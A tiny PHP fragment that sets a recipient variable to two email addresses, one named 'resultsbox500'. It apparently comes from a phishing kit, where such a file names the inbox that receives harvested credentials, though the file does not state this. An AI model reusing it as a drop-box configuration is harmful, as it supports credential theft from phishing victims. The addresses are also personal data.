<?php

$to ="resultsbox500@gmail.com,awesome.ganee@yandex.com
";

?>